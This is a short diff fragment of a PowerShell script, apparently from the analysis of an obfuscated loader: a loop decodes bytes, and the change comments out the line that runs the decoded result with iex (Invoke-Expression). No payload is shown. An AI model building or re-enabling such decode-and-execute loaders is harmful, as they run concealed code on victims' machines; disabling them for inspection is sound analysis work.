@@ -10,7 +10,7 @@ $dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
         $prev
     })
 
-iex([System.Text.Encoding]::UTF8.GetString($dec))
+#iex([System.Text.Encoding]::UTF8.GetString($dec))
 
 
 ##look at proxy 
